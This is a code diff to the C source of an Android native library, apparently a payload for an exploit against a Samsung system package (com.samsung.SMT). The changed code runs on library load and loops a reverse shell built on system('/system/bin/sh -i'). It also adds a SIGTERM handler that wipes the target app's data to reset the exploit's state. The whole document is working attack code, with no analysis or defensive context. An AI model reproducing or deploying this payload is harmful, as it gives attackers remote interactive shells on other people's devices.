@@ -6,6 +6,7 @@
 #include <sys/wait.h>
 #include <arpa/inet.h>
 #include <android/log.h>
+#include <signal.h>
 
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, "mercury-native", __VA_ARGS__)
 
@@ -47,17 +48,26 @@ static void reverse_shell() {
     system("/system/bin/sh -i");
 }
 
+/**
+ * This is a bit of a hack, but allows us to easily reset the exploit's state,
+ * and also kill the reverse shell if the user wants to, using `kill $PPID`.
+ */
+void sig_handler(int signo) {
+    if (signo == SIGTERM) {
+        LOGE("caught SIGTERM, clearing SMT data");
+        system("pm clear com.samsung.SMT");
+    }
+}
+
 __attribute__((constructor)) static void on_load() {
-    int pid;
     LOGE("on_load() called, my uid is %d", getuid());
-    pid = fork();
-    if (pid == 0) {
-        // child
-        LOGE("starting reverse shell");
-        while (1) {
-            // start the shell again, so the client can reconnect after exiting
-            reverse_shell();
-            sleep(1);
-        }
+    if (signal(SIGTERM, sig_handler) == SIG_ERR) {
+        LOGE("can't catch SIGTERM!");
+    }
+
+    while (1) {
+        // loop so the client can reconnect after exiting
+        reverse_shell();
+        sleep(1);
     }
 }
